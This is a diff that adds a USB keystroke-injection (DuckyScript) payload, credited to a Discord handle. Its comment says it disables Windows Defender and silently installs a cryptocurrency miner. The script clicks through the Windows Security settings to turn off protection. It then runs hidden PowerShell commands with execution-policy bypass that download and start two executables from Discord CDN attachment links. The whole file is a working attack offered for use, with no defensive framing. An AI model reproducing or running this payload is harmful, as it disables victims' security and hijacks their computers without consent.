@@ -1,0 +1,56 @@
+REM --- Kills windows defender and installs a silent crypto miner on target computer
+REM --- Made by Disabled#8989
+
+
+DELAY 1000
+GUI i
+DELAY 1000
+TAB
+RIGHTARROW
+REPEAT 11
+ENTER
+DELAY 600
+TAB
+DOWNARROW
+DOWNARROW
+ENTER
+DELAY 600
+TAB
+TAB
+ENTER
+DELAY 1000
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 400
+SPACE
+DELAY 400
+ALT y
+DELAY 400
+ALT F4
+DELAY 400
+ALT F4
+DELAY 1000
+
+
+REM --- DOWNLOAD AND RUN DEFENDERCONTROL
+GUI r
+DELAY 100
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/877793447124279327/887264882171478016/dfControl.exe',\"$env:temp\bob.exe\"); Start-Process \"$env:temp\bob.exe\""
+ENTER
+DELAY 1500
+ALT y
+DELAY 900
+ENTER
+DELAY 1500
+ALT F4
+
+REM --- DOWNLOAD AND RUN MINER
+GUI r
+DELAY 100
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/869675809466626058/887792977337012264/convars.exe',\"$env:temp\bob.exe\"); Start-Process \"$env:temp\bob.exe\""
+ENTER
+DELAY 3000
+ALT y
